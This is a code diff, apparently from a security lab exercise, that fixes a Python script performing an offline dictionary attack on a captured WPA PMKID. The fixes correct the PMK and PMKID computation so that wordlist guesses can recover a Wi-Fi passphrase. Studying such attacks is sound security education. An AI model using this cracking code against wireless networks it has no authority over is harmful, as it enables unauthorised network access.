@@ -24,7 +24,7 @@ from numpy import array_split
 from numpy import array
 import hmac, hashlib
 
-const PMK_NAME = b"PMK Name"
+PMK_NAME = b"PMK Name"
 
 def customPRF512(key,A,B):
     """
@@ -40,7 +40,7 @@ def customPRF512(key,A,B):
     return R[:blen]
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("PMKID_handshake.cap") 
+wpa=rdpcap("PMKID_handshake.pcap") 
 
 assocRequests = []
 # get info from first association request (ssid, APMac, ClientMAC)
@@ -65,22 +65,27 @@ def getPMKIDFromFirstHandshakeMessage(packets, apmac, climac):
             
 
 
-# On voit facilement sur Wireshark que la PMKID correspond à 16 Bytes avant les 4 derniers
+# With Wireshark we can easily see that PMKID are the 16 bytes before the 4 leas bytes
 def getPMKIDFromPacket(packet):
     return raw(packet)[-20:-4]
 
 
 def attack(expected_pmkid, infos):
-    words = open('superdico.txt', 'r').readlines
+    words = open('superdico.txt', 'r').readlines()
     
     for word in words:
         word = word.strip()
-        passPhrase = str.encode(word)
-        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)()
-        computed_pmkid = hmac.new(pmk, CONST_NAME + infos[1] + infos[2], hashlib.sha1)
+        passPhrase = word.encode()
+        ssid = infos[0].encode()
+        apmac = a2b_hex(infos[1].replace(':', ''))
+        climac = a2b_hex(infos[2].replace(':', ''))
+        
+        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
+        computed_pmkid = hmac.new(pmk, PMK_NAME + apmac + climac, hashlib.sha1)
 
-        if computed_pmkid == expected_pmkid:
-            print("Found result with word {} on the network with SSID {}", word, infos[0]) 
+        # So we only take the first 16 bytes
+        if computed_pmkid.digest()[:16] == expected_pmkid:
+            print("Found result with passphrase '"+ word +"' on the network with SSID " + ssid.decode()) 
 
     return
 
